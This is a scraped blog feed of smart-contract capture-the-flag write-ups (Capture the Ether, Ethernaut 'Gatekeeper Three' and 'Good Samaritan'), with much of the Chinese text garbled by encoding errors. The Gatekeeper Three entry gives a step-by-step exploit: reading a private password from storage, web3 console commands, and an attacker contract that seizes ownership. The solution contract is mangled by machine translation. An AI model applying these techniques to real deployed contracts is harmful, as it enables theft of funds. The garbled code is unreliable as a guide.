contract","date":"2023-03-20T02:33:10.000Z","updated":"2023-03-20T02:33:10.000Z","comments":true,"path":"2023/03/20/Smart contracts/capther the ether/Deploy a contract/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/20/Smart%20contracts/capther%20the%20ether/Deploy%20a%20contract/","excerpt":"","text":"Deploy a contracttipsï¼š å®è—åšå®¢1. é¢˜ç›®è¦æ±‚ 1.1 To complete this challenge, you need to: Install MetaMask. Switch to the Ropsten test network. Get some Ropsten ether. Clicking the â€œbuyâ€ button in MetaMask will take you to a faucet that gives out free test ether. After youâ€™ve done that, press the red button on the left to deploy the challenge contract. You donâ€™t need to do anything with the contract once itâ€™s deployed. Just click the â€œCheck Solutionâ€ button to verify that you deployed successfully. 1.2 é¢˜ç›®ä»£ç ï¼š 12345678pragma solidity ^0.4.21;contract DeployChallenge &#123; // This tells the CaptureTheFlag contract that the challenge is complete. function isComplete() public pure returns (bool) &#123; return true; &#125;&#125; 2. åˆ†æ 2.1 è¯¥é¢˜å¾ˆç®€å•ï¼Œç›´æ¥æ”¾åˆ°remix ä¸Šé¢éƒ¨ç½²å°±ok äº† 3. è§£é¢˜","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"é¶åœº","slug":"é¶åœº","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Gatekeeper Three","slug":"Smart contracts/ethernaut/Gatekeeper Three","date":"2023-03-13T06:33:10.000Z","updated":"2023-03-13T06:33:10.000Z","comments":true,"path":"2023/03/13/Smart contracts/ethernaut/Gatekeeper Three/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/13/Smart%20contracts/ethernaut/Gatekeeper%20Three/","excerpt":"","text":"Gatekeeper Three1. é¢˜ç›®è¦æ±‚ 1.1 åº”å¯¹å¤§é—¨å¹¶æˆä¸ºè¿›å…¥è€…ã€‚ å¯èƒ½æœ‰å¸®åŠ©çš„äº‹æƒ…ï¼š è°ƒç”¨ä½çº§å‡½æ•°çš„è¿”å›å€¼ã€‚ æ³¨æ„è¯­ä¹‰ã€‚ åˆ·æ–°å­˜å‚¨åœ¨ä»¥å¤ªåŠä¸­çš„å·¥ä½œæ–¹å¼ 1.2 é¢˜ç›®ä»£ç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract SimpleTrick &#123; GatekeeperThree public target; address public trick; uint private password = block.timestamp; constructor (address payable _target) &#123; target = GatekeeperThree(_target); &#125; function checkPassword(uint _password) public returns (bool) &#123; if (_password == password) &#123; return true; &#125; password = block.timestamp; return false; &#125; function trickInit() public &#123; trick = address(this); &#125; function trickyTrick() public &#123; if (address(this) == msg.sender &amp;&amp; address(this) != trick) &#123; target.getAllowance(password); &#125; &#125;&#125;contract GatekeeperThree &#123; address public owner; address public entrant; bool public allow_enterance = false; SimpleTrick public trick; function construct0r() public &#123; owner = msg.sender; &#125; modifier gateOne() &#123; require(msg.sender == owner); require(tx.origin != owner); _; &#125; modifier gateTwo() &#123; require(allow_enterance == true); _; &#125; modifier gateThree() &#123; if (address(this).balance &gt; 0.001 ether &amp;&amp; payable(owner).send(0.001 ether) == false) &#123; _; &#125; &#125; function getAllowance(uint _password) public &#123; if (trick.checkPassword(_password)) &#123; allow_enterance = true; &#125; &#125; function createTrick() public &#123; trick = new SimpleTrick(payable(address(this))); trick.trickInit(); &#125; function enter() public gateOne gateTwo gateThree returns (bool entered) &#123; entrant = tx.origin; return true; &#125; receive () external payable &#123;&#125;&#125; 2. åˆ†ætips: å‚è€ƒåšå®¢æ³¨æ„è¯­ä¹‰ï¼›è¿™æ˜¯ä¸€ä¸ªå·¨å¤§çš„èµ å“ã€‚é¦–å…ˆæƒ³åˆ°çš„æ˜¯æ—§ç‰ˆæœ¬Solidity 0.4.xä¸­çš„ä¸€ä¸ªè€æŒ‘æˆ˜ï¼Œé‚£é‡Œæ²¡æœ‰constructorå…³é”®å­—ï¼Œç›¸åï¼Œæˆ‘ä»¬å¿…é¡»åˆ›å»ºä¸€ä¸ªä¸åˆçº¦åŒåçš„å‡½æ•°ã€‚ ç„¶è€Œï¼Œæˆ‘ä»¬ç°åœ¨å·²ç»è¿›å…¥äº† 0.8.18 æ—¶ä»£ï¼›è¿˜æœ‰ä»€ä¹ˆå¯èƒ½å‡ºé”™ï¼Ÿæˆ‘å¿«é€Ÿæµè§ˆäº†ä¸€ä¸‹åˆåŒï¼Œç«‹å³æ³¨æ„åˆ°äº†ä¸€äº›å¥‡æ€ªçš„åœ°æ–¹ã€‚å¿«å»çœ‹çœ‹ï¼›ä½ æ³¨æ„åˆ°äº†å—ï¼Ÿ 1function construct0r() public &#123;owner = msg.sender;&#125; ç”·å­©ï¼Œæˆ‘çŸ¥é“è¿™æœ‰é—®é¢˜ï¼Œ100%ã€‚ä½†ç›´åˆ°ç°åœ¨ï¼Œæˆ‘ä»ç„¶ä¸çŸ¥é“æˆ‘è¦å¤„ç†è¿™ä»½åˆåŒã€‚ æˆ‘ä¼šå°†æˆ‘æœ€åˆçš„æƒ³æ³•è®°å½•ä¸ºè¯„è®ºã€‚å¹¶éæ‰€æœ‰è¿™äº›éƒ½å¿…é¡»æ­£ç¡®ï¼Œä½†åœ¨é˜…è¯»æ™ºèƒ½åˆçº¦æ—¶è®°ä¸‹æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„åšæ³•ã€‚æ¯å½“æˆ‘å¤„ç†ä¸€ä¸ªæ–°çš„ä»£ç åº“æ—¶ï¼Œæˆ‘éƒ½ä¼šä½¿ç”¨ç±»ä¼¼Inline Bookmarks çš„ä¸œè¥¿ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889*// SPDX-License-Identifier: MIT*pragma solidity ^0.8.0;contract SimpleTrick &#123; GatekeeperThree public target; address public trick;//maybe need a function to get the current timestamp? uint private password = block.timestamp; constructor (address payable _target) &#123; target = GatekeeperThree(_target); &#125; //first time running this will set the password as current timestamp? //although it is private, doens&#x27;t mean we cannot get the vaule back function checkPassword(uint _password) public returns (bool) &#123; if (_password == password) &#123; return true; &#125; password = block.timestamp; return false; &#125; //everyone can call this and it will set trick to the contract address function trickInit() public &#123; trick = address(this); &#125; //if the caller of frunction is this address and //this address is not trick, then it will call target.getAllowance(password) function trickyTrick() public &#123; if (address(this) == msg.sender &amp;&amp; address(this) != trick) &#123; target.getAllowance(password); &#125; &#125;&#125;contract GatekeeperThree &#123; address public owner; address public entrant; bool public allow_enterance = false; SimpleTrick public trick;//everyone can call this, so owner can be anyone function construct0r() public &#123; owner = msg.sender; &#125;//to pass we have to change the owner, but let the tx.origin be the contract? modifier gateOne() &#123; require(msg.sender == owner); require(tx.origin != owner); _; &#125;//straight forward stuff modifier gateTwo() &#123; require(allow_enterance == true); _; &#125;//this gate reuqire us to drain the address balance? not sure modifier gateThree() &#123; if (address(this).balance &gt; 0.001 ether &amp;&amp; payable(owner).send(0.001 ether) == false) &#123; _; &#125; &#125;//need to get the password to pass gate_two function getAllowance(uint _password) public &#123; if (trick.checkPassword(_password)) &#123; allow_enterance = true; &#125; &#125;//this function can create a new trick contract? using this contract addr as//constructor argument function createTrick() public &#123; trick = new SimpleTrick(payable(address(this))); trick.trickInit(); &#125;//pass all the gate function enter() public gateOne gateTwo gateThree returns (bool entered) &#123; entrant = tx.origin; return true; &#125; receive () external payable &#123;&#125;&#125; æ‰€ä»¥åŸºæœ¬ä¸Šæœ€ç»ˆç›®æ ‡æ˜¯è°ƒç”¨enter()å‡½æ•°ï¼ˆå¯ä»¥æ˜¯ EOA æˆ–æˆ‘ä»¬æ„å»ºçš„æ™ºèƒ½åˆçº¦â€¦â€¦å¯¹å—ï¼Ÿï¼‰ï¼Œå®ƒå¯ä»¥ä¼ é€’gateOneã€gateTwoå’ŒgateThreeä¿®é¥°ç¬¦ã€‚è®©æˆ‘ä»¬ä»”ç»†çœ‹çœ‹æ¯ä¸ªé—¨ï¼š 1å·é—¨1234modifier gateOne() &#123; require(msg.sender == owner); require(tx.origin != owner); _; &#125; è®©æˆ‘ä»¬å›é¡¾ä¸€ä¸‹tx.originã€‚ tx.originæ˜¯æœ€åˆå‘èµ·äº¤æ˜“çš„åœ°å€ï¼Œæ— è®ºåœ¨æ­¤è¿‡ç¨‹ä¸­è¿›è¡Œäº†å¤šå°‘æ¬¡åˆçº¦è°ƒç”¨ã€‚ msg.senderæ˜¯å½“å‰å‡½æ•°çš„ç›´æ¥è°ƒç”¨è€…çš„åœ°å€ã€‚ åœ¨è°ƒç”¨é“¾ A-&gt;B-&gt;C-&gt;D ä¸­ï¼Œåœ¨ D å†…éƒ¨ï¼Œmsg.senderå°†æ˜¯ Cï¼Œå¹¶ä¸”tx.originå°†æ˜¯ Aã€‚ æ»¡è¶³æ­¤ä¿®é¥°ç¬¦çš„ä¸€ç§æ–¹æ³•æ˜¯å°†å¦ä¸€ä¸ªåˆçº¦è®¾ç½®ä¸ºæ‰€æœ‰è€…ï¼Œè€Œæˆ‘ä»¬ï¼ˆä¸€ä¸ª EOAï¼‰å°†æˆä¸ºtx.origin. è®©æˆ‘ä»¬æŠ±ç€è¿™ä¸ªå¿µå¤´ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½ç»§ç»­é€šè¿‡å…¶ä»–çš„é—¨ã€‚ 2å·é—¨1234567891011121314151617181920modifier gateTwo() &#123;require(allow_enterance == true);_;&#125;function getAllowance(uint _password) public &#123; if (trick.checkPassword(_password)) &#123; allow_enterance = true; &#125; &#125;//Simple Trick Contract: uint private password = block.timestamp;//................///function checkPassword(uint _password) public returns (bool) &#123; if (_password == password) &#123; return true; &#125; password = block.timestamp; return false; &#125; å¦‚æœæˆ‘ä»¬å¯ä»¥è¾“å…¥æ­£ç¡®çš„å¯†ç ä½œä¸º çš„å‚æ•°getAllowance()ï¼Œè¿™å¿…é¡»é€šè¿‡trick.checkPassword()å‡½æ•°ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç ´è§£é—¨ 2. å¦‚ä½•æ‰¾åˆ°å¯†ç ï¼Ÿæˆ‘ä»¬éœ€è¦ä¸€ç§æ–¹æ³•æ¥æ£€æŸ¥ç§æœ‰å˜é‡passwordã€‚æ·±å…¥äº†è§£ Solidity Storageå¯èƒ½ä¼šæœ‰æ‰€å¸®åŠ©ã€‚ 3å·é—¨123456modifier gateThree () &#123; if ( address ( this ).balance &gt; 0.001 ether &amp;&amp; payable (owner). send ( 0.001 ether) == false ) &#123; _; &#125; &#125; è¿™ä¼¼ä¹æ˜¯ä¸€ä¸ªæ£˜æ‰‹çš„é—®é¢˜ï¼Œå› ä¸ºæˆ‘ä»¬å¿…é¡»æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š å½“å‰åˆçº¦çš„ä½™é¢ ( address(this)) å¿…é¡»å¤§äº 0.001 ä»¥å¤ªå¸ã€‚ å‘åˆçº¦æ‰€æœ‰è€…ï¼ˆç”¨ è¡¨ç¤ºpayable(owner)ï¼‰å‘é€ 0.001 ä»¥å¤ªä¸€å®šä¼šå¤±è´¥ï¼ˆç”¨ è¡¨ç¤ºpayable(owner).send(0.001 ether) == falseï¼‰ã€‚ å®ƒè¯å®äº†æˆ‘çš„æƒ³æ³•ï¼Œå³æˆ‘ä»¬éœ€è¦ä¸€ä¸ªå¤–éƒ¨åˆçº¦ï¼Œå› ä¸ºæˆ‘ä»¬å¯ä»¥æŸç§æ–¹å¼revert()æ‹’ç»ä»»ä½•ä¼ å…¥çš„ ETHã€‚ é«˜å±‚è¡ŒåŠ¨è®¡åˆ’å¦‚æœæ‚¨ç†Ÿæ‚‰æ‰€æœ‰æ¦‚å¿µï¼Œè¿™é‡Œæ˜¯æ‚¨å¯ä»¥éµå¾ªçš„è¡ŒåŠ¨è®¡åˆ’ã€‚æ¥å§ï¼Œè‡ªå·±è¯•è¯•å§ï¼ ç”¨äºcreateTrick()éƒ¨ç½²æ–°çš„ SimpleTrick åˆçº¦ é€šè¿‡ web3js getStorageAt å‡½æ•°å–å›å¯†ç  getAllowance(password)ä½¿ç”¨æˆ‘ä»¬åˆšåˆšæ£€ç´¢åˆ°çš„å¯†ç è¿è¡Œï¼ˆgate 2 å·²è§£å†³ï¼‰ å‘é€ 0.0011 ä»¥å¤ªå¸åˆ°å®ä¾‹åˆçº¦åœ°å€ï¼ˆé—¨ 3 è¦æ±‚çš„ä¸€éƒ¨åˆ†ï¼‰ å¯¹äº gate1 å’Œ gate3ï¼Œæˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ªåˆçº¦æ¥ï¼š è¿è¡Œè¯¥construct0r()å‡½æ•°ï¼Œä½¿å…¶æˆä¸ºæ‰€æœ‰è€… åˆ›å»ºä¸€ä¸ªå‡½æ•°ï¼Œä½¿å…¶æ— æ³•æ¥æ”¶ä»»ä½•ä»¥å¤ªå¸ è¿è¡Œenter()å‡½æ•° å‚èµ›è€…tx.originç°åœ¨åº”è¯¥æ˜¯ï¼ˆæˆ‘ä»¬çš„åœ°å€ï¼‰ã€‚ ä¸€æ­¥ä¸€æ­¥çš„æ¼”ç»ƒç°åœ¨æˆ‘ä»¬å°†é€æ­¥å®Œæˆè§£å†³æ–¹æ¡ˆã€‚é¦–å…ˆï¼Œè·å–ä¸€ä¸ªæ–°å®ä¾‹ã€‚ è·å–æ–°å®ä¾‹ æ‚¨åº”è¯¥èƒ½å¤Ÿåœ¨æ§åˆ¶å°ä¸­çœ‹åˆ°ä¸€ä¸ªå®ä¾‹åœ°å€ã€‚ è·å–æ‚¨çš„å®ä¾‹åœ°å€ æ¥ä¸‹æ¥ï¼Œè®©æˆ‘ä»¬å»æ··éŸ³ã€‚åœ¨åˆåŒæ–‡ä»¶å¤¹ä¸­åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œå¹¶å°†æŒ‘æˆ˜ä¸­çš„æ‰€æœ‰ä»£ç ç²˜è´´åˆ°å…¶ä¸­ã€‚ä½ åº”è¯¥æœ‰è¿™æ ·çš„ä¸œè¥¿ï¼š æ³¨æ„å·¦è¾¹åº”è¯¥é€‰æ‹©ä»€ä¹ˆï¼ˆå…ˆæŒ‰å·¦è¾¹çš„ ETH æ ‡å¿—ï¼‰ï¼š ç¯å¢ƒï¼šæˆ‘ä»¬éœ€è¦ä½¿ç”¨ Injected Provider â€” MetaMaskã€‚ è´¦æˆ·ï¼šé€‰æ‹©åŠ è½½äº†ä¸€äº›æµ‹è¯•ethçš„è´¦æˆ·ï¼ˆå¦‚æœä½ è¯„è®ºä½ çš„åœ°å€ï¼Œæˆ‘ä¼šå‘ç»™ä½ ä¸€äº›ï¼‰ã€‚ Contract : Gatekeeper Three å½“ç„¶ä¸æ˜¯SimpleTrickã€‚ è¿™æ˜¯è¯€çªï¼š å¦‚æœæ‚¨åœ¨è“è‰²æŒ‰é’®æ—è¾¹è¾“å…¥åˆçº¦åœ°å€At Addressï¼Œæ‚¨ç°åœ¨å¯ä»¥ä¸å·²éƒ¨ç½²çš„åˆçº¦è¿›è¡Œäº¤äº’ã€‚ ï¼ˆæˆ‘ä»¥å‰è§‰å¾—å¾ˆç¥å¥‡ï¼Œä½†æ¯•ç«Ÿæˆ‘ä»¬åªéœ€è¦3æ ·ä¸œè¥¿å°±å¯ä»¥å’ŒEVMæ™ºèƒ½åˆçº¦äº¤äº’ï¼šChainIDï¼Œéƒ¨ç½²åœ°å€ï¼Œåˆçº¦&#x2F;ABIã€‚ï¼‰ è¿™æ˜¯æŒ‰ä¸‹At Address æŒ‰é’®åæ‚¨å°†çœ‹åˆ°çš„å†…å®¹ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨createTrick å‡½æ•°ï¼ˆæ©™è‰²ï¼‰æ¥éƒ¨ç½² SimpleTrick åˆçº¦çš„å®ä¾‹ã€‚ æ±‚è§£é—¨ 2ç”±äºtrickï¼ˆè“è‰²æŒ‰é’®ï¼‰æ˜¯ä¸€ä¸ªå…¬å…±å˜é‡ï¼Œå¯ä»¥ä½¿ç”¨getterå‡½æ•°è°ƒç”¨å®ƒã€‚ç°åœ¨æˆ‘ä»¬éœ€è¦è·å–å¯†ç ã€‚å¦‚æœæ‚¨ä¸çŸ¥é“ Solidity ä¸­çš„å­˜å‚¨æ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Œè¯·è°·æ­Œã€‚ åœ¨æ‚¨çš„æ§åˆ¶å°ä¸­ï¼Œè¿è¡Œä»¥ä¸‹è¡Œï¼š 1await web3.eth.getStorageAt(â€œYOUR_SIMPLE_TRICK_ADDRESSâ€, 2, console.log) æ‚¨åº”è¯¥èƒ½å¤Ÿå¾—åˆ°è¿™æ ·çš„åå…­è¿›åˆ¶æ•°ï¼š0x00000000000000000000000000000000000000000000000000000000640bf3a8ã€‚ è¿™å°†æ˜¯å¯†ç ã€‚ç°åœ¨ï¼Œå›åˆ° Remixï¼Œå…ˆæ‰“å¼€ 2 å·é—¨ï¼ allow entry &#x3D; false è¿è¡Œå‰getAllowance() getAllowance ä½¿ç”¨æˆ‘ä»¬ä»è¯»å–å­˜å‚¨ä¸­è·å¾—çš„åå…­è¿›åˆ¶æ•°è¿è¡Œè¯¥å‡½æ•°ã€‚è¯·æ³¨æ„ï¼Œallow_enteranceåœ¨è¿è¡Œè¯¥å‡½æ•°ä¹‹å‰ï¼Œï¼ˆé”™è¯¯çš„æ‹¼å†™ï¼‰ä¸ºå‡ã€‚è¿è¡Œâ€œgetAllowanceâ€å‡½æ•°åï¼Œå®ƒå°†è¿”å› trueã€‚ å‘é€ETHè§£å†³50%é—¨3å¯¹äº 3 å·é—¨ï¼Œæˆ‘ä»¬å¿…é¡»å‘åˆçº¦å‘é€ä¸€å°éƒ¨åˆ†ä»¥å¤ªå¸ï¼Œè¿™æ ·address(this).balance &gt; 0.001 etheræ‰ä¼šæˆç«‹ã€‚ åœ¨æ§åˆ¶å°ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸€è¡Œï¼š 1234ç­‰å¾… web3.ethã€‚sendTransaction ( &#123;from: player, to: â€œYOUR_INSTANCE_ADDRESSâ€, value: 10000000000000000 &#125; ) å¯¹äºâ€œå€¼â€éƒ¨åˆ†ï¼Œè™½ç„¶è¿™ä¸æ˜¯æœ€ä½³åšæ³•ï¼ˆå› ä¸ºè¾“å…¥é‚£ä¹ˆå¤šé›¶é€šå¸¸ä¼šé€ æˆæ··æ·†ï¼‰ï¼Œä½†æˆ‘çŸ¥é“ä»¥å¤ªå¸æ˜¯åè¿›åˆ¶çš„ 18 ä½ï¼Œå› æ­¤åŠ ä¸Š 16 ä¸ªé›¶å°±æ˜¯ 0.01 ä»¥å¤ªå¸ã€‚ è¿™ä¸æ˜¯ä½ åº”è¯¥åšçš„äº‹æƒ…ï¼Œä½†æœ‰æ—¶å½“ä½ æ²¡æœ‰å®ç”¨åŠŸèƒ½æ—¶ï¼ˆä¾‹å¦‚ï¼Œä¸ Remix æˆ– Etherscan ä¸Šçš„åˆçº¦äº¤äº’ï¼‰ï¼Œä½ åªéœ€è¦è¾“å…¥è¿™äº›é›¶ã€‚ å½“ç„¶ï¼Œæ¨èçš„æ–¹å¼æ˜¯è¿™æ ·çš„ï¼š 1await web3.eth.sendTransaction(&#123;from: player, to: â€œYOUR_INSTANCE_ADDRESSâ€, value: web3.utils.toWei(â€˜0.011â€™, â€˜etherâ€™)&#125;) å»ºç­‘è§£å†³æ–¹æ¡ˆåˆåŒæˆ‘ä»¬è¿˜å¿…é¡»å¤„ç†é—¨ 1 å’Œé—¨ 3 çš„ä¸€éƒ¨åˆ†ã€‚è®©æˆ‘ä»¬æ€»ç»“éœ€æ±‚å¹¶èµ·è‰æ™ºèƒ½åˆçº¦ã€‚å®ƒåº”è¯¥ï¼š è°ƒç”¨è¯¥construct0r()å‡½æ•°ï¼Œä½¿å…¶æˆä¸º msg.senderã€‚ æœ‰ä¸€ä¸ªå‡½æ•°å¯ä»¥è°ƒç”¨enter()å‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„åœ°å€å¯ä»¥å˜æˆtx.originï¼Œmsg.senderå°±æ˜¯è¿™ä¸ªæ–°åˆçº¦ã€‚ è¯¥åˆçº¦ä¸åº”æ¥æ”¶ä»»ä½•ä»¥å¤ªå¸ã€‚ è¿™æ˜¯æˆ‘èµ·è‰çš„ä¸€ä»½å°åˆåŒæ¥å¤„ç†æ‰€æœ‰è¿™äº›é—®é¢˜ã€‚æ‚¨ä¸å¿…æŒ‰ç…§æˆ‘çš„æ–¹å¼è¿›è¡Œï¼ˆä¾‹å¦‚ï¼Œå°è¯•å°†å‡½æ•°æ”¾å…¥solve()æ„é€ å‡½æ•°ä¸­ï¼Œæˆ–å°†ç›®æ ‡åœ°å€ç¡¬ç¼–ç åœ¨å…¶ä¸­ï¼‰ã€‚ 123456789101112131415161718åˆåŒè§£å†³æ–¹æ¡ˆ&#123; GatekeeperThreeå…¬å…±ç›®æ ‡ï¼› åœ°å€å…¬å…±æ‰€æœ‰è€…ï¼› æ„é€ å‡½æ•°ï¼ˆåœ°å€_targetï¼‰&#123; target = GatekeeperThreeï¼ˆpayableï¼ˆ_targetï¼‰ï¼‰; target.construct0r(); &#125; function solve () public returns ( bool entered ) &#123; entered = target.enter(); &#125; æ¥æ”¶ () å¤–éƒ¨åº”ä»˜æ¬¾ &#123; revert(); &#125; &#125; æ‚¨å¯ä»¥åœ¨æ··éŸ³çš„åŒä¸€æ–‡ä»¶ä¸­å°†å…¶ä½œä¸ºåˆåŒé”®å…¥ã€‚ åœ¨ Deploy æŒ‰é’®é¡¶éƒ¨çš„åˆåŒæ¡†ä¸­ï¼Œè¯·è®°ä½é€‰æ‹©åˆåŒè§£å†³æ–¹æ¡ˆã€‚å¦‚æœæ‚¨æŒ‰ç…§æˆ‘çš„æŒ‡å—æ“ä½œï¼Œåˆ™è¿˜éœ€è¦è¾“å…¥ç›®æ ‡ï¼ˆGateKeeper åˆçº¦ï¼‰åœ°å€ã€‚ æœ€åï¼Œç§»åŠ¨è§£å†³æŒ‰é’®å¹¶å®ŒæˆæŒ‘æˆ˜ï¼ å¯ä»¥æŸ¥çœ‹å‚èµ›è€…æ˜¯å¦æ”¹æˆè‡ªå·±çš„åœ°å€ï¼š è¿”å› Ethernaut å¹¶æäº¤å®ä¾‹â€¦â€¦ åšå¾—å¥½çš„æ¶ˆæ¯æ€»æ˜¯ä»¤äººæ»¡æ„ã€‚ 3. è§£é¢˜","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"é¶åœº","slug":"é¶åœº","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Good Samaritan","slug":"Smart contracts/ethernaut/Good Samaritan","date":"2023-03-13T05:29:10.000Z","updated":"2023-03-13T05:29:10.000Z","comments":true,"path":"2023/03/13/Smart contracts/ethernaut/Good Samaritan/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/13/Smart%20contracts/ethernaut/Good%20Samaritan/","excerpt":"","text":"Good Samaritan1. é¢˜ç›®è¦æ±‚ 1.1 This instance represents a Good Samaritan that is wealthy and ready to donate some coins to anyone requesting it. Would you be able to drain all the balance from his Wallet? Things that might help: Solidity Custom Errors 1.2 é¢˜ç›®ä»£ç ï¼š // SPDX-License-Identifier: MIT pragma solidity &gt;=0.8.0 &lt;0.9.0; import &quot;openzeppelin-contracts-08/utils/Address.sol&quot;; contract GoodSamaritan &#123; Wallet public wallet; Coin public coin; constructor() &#123; wallet = new Wallet(); coin = new Coin(address(wallet)); wallet.setCoin(coin); &#125; function requestDonation() external returns(bool enoughBalance)&#123; // donate 10 coins to requester try wallet.donate10(msg.sender) &#123; return true; &#125; catch (bytes memory err) &#123; if (keccak256(abi.encodeWithSignature(&quot;NotEnoughBalance()&quot;)) == keccak256(err)) &#123; // send the coins left wallet.transferRemainder(msg.sender); return false; &#125; &#125; &#125; &#125; contract Coin &#123; using Address for address; mapping(address =&gt; uint256) public balances; error InsufficientBalance(uint256 current, uint256 required); constructor(address wallet_) &#123; // one million coins for Good Samaritan initially balances[wallet_] = 10**6; &#125; function transfer(address dest_, uint256 amount_) external &#123; uint256 currentBalance = balances[msg.sender]; // transfer only occurs if balance is enough if(amount_ &lt;= currentBalance) &#123; balances[msg.sender] -= amount_; balances[dest_] += amount_; if(dest_.isContract()) &#123; // notify contract INotifyable(dest_).notify(amount_); &#125; &#125; else &#123; revert InsufficientBalance(currentBalance, amount_); &#125; &#125; &#125; contract Wallet &#123; // The owner of the wallet instance address public owner; Coin public coin; error OnlyOwner(); error NotEnoughBalance(); modifier onlyOwner() &#123; if(msg.sender != owner) &#123; revert OnlyOwner(); &#125; _; &#125; constructor() &#123; owner = msg.sender; &#125; function donate10(address dest_) external onlyOwner &#123; // check balance left if (coin.balances(address(this)) &lt; 10) &#123; revert NotEnoughBalance(); &#125; else &#123; // donate 10 coins coin.transfer(dest_, 10); &#125; &#125; function transferRemainder(address dest_) external onlyOwner &#123; // transfer balance left coin.transfer(dest_, coin.balances(address(this))); &#125; function setCoin(Coin coin_) external onlyOwner &#123; coin = coin_; &#125; &#125; interface INotifyable &#123; function notify(uint256 amount) external; &#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061- ## 2. åˆ†æ#### tips: å‚è€ƒåšå®¢åœ¨è¿™ä¸ªçº§åˆ«ï¼Œæœ‰ 3 ä¸ªåˆåŒã€‚`GoodSamaritan`æ˜¯æˆ‘ä»¬å°†ä¸ä¹‹äº¤äº’çš„é‚£ä¸ªã€‚`contract.abi`æˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨æ§åˆ¶å°ä¸­æ‰§è¡Œæ¥éªŒè¯è¿™ä¸€ç‚¹ã€‚![å›¾ç‰‡.png](https://cdn.staticaly.com/gh/LBiyou/BlogImages@main/img/202306020024317.png)è®©æˆ‘ä»¬çœ‹ä¸€ä¸‹åˆåŒã€‚### é’±åŒ…```soliditycontract Wallet &#123; // The owner of the wallet instance address public owner; Coin public coin; error OnlyOwner(); error NotEnoughBalance(); modifier onlyOwner() &#123; if(msg.sender != owner) &#123; revert OnlyOwner(); &#125; _; &#125; constructor() &#123; owner = msg.sender; &#125; function donate10(address dest_) external onlyOwner &#123; // check balance left if (coin.balances(address(this)) &lt; 10) &#123; revert NotEnoughBalance(); &#125; else &#123; // donate 10 coins coin.transfer(dest_, 10); &#125; &#125; function transferRemainder(address dest_) external onlyOwner &#123; // transfer balance left coin.transfer(dest_, coin.balances(address(this))); &#125; function setCoin(Coin coin_) external onlyOwner &#123; coin = coin_; &#125;&#125; é’±åŒ…åœ¨é¡¶éƒ¨å®šä¹‰äº†ä¸¤ä¸ªè‡ªå®šä¹‰é”™è¯¯ï¼Œå®ƒåœ¨ revert è¯­å¥ä¸­ä½¿ç”¨ã€‚ è¯¥å‡½æ•°donate10()è¢«è°ƒç”¨ä»¥å‘è¯·æ±‚è€…æèµ  10 ä¸ªç¡¬å¸ã€‚å®ƒåœ¨è½¬è´¦å‰æ£€æŸ¥åˆçº¦ä½™é¢ ( )ï¼Œå¦‚æœå°äº 10ï¼Œåˆ™GoodSamaritanè¿”å›è‡ªå®šä¹‰é”™è¯¯ ( )ã€‚å¦åˆ™ï¼Œå®ƒåªè½¬è´¦ 10 ä¸ªç¡¬å¸ã€‚NotEnoughBalance() å‡½æ•°transferRemainder()å°†å­˜å‚¨åœ¨åˆçº¦ä¸­çš„æ‰€æœ‰ç¡¬å¸è½¬ç§»ç»™è¯·æ±‚è€…ã€‚æˆ‘ä»¬éœ€è¦ä»¥æŸç§æ–¹å¼è§¦å‘æ­¤åŠŸèƒ½ã€‚ ä¸Šé¢æè¿°çš„ä¸¤ä¸ªå‡½æ•°onlyOwneréƒ½åªå…è®¸æ‰€æœ‰è€…è°ƒç”¨å®ƒä»¬ã€‚GoodSamaritanåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä¸šä¸»å°†ç­¾è®¢åˆåŒã€‚ ç¡¬å¸1234567891011121314151617181920212223242526272829contract Coin &#123; using Address for address; mapping(address =&gt; uint256) public balances; error InsufficientBalance(uint256 current, uint256 required); constructor(address wallet_) &#123; // one million coins for Good Samaritan initially balances[wallet_] = 10**6; &#125; function transfer(address dest_, uint256 amount_) external &#123; uint256 currentBalance = balances[msg.sender]; // transfer only occurs if balance is enough if(amount_ &lt;= currentBalance) &#123; balances[msg.sender] -= amount_; balances[dest_] += amount_; if(dest_.isContract()) &#123; // notify contract INotifyable(dest_).notify(amount_); &#125; &#125; else &#123; revert InsufficientBalance(currentBalance, amount_); &#125; &#125;&#125; Coin åˆçº¦å°†ä¸€ç™¾ä¸‡ä¸ªç¡¬å¸æ·»åŠ åˆ°GoodSamaritanæ„é€ å‡½æ•°å†…éƒ¨çš„åˆçº¦ä½™é¢ä¸­ã€‚ 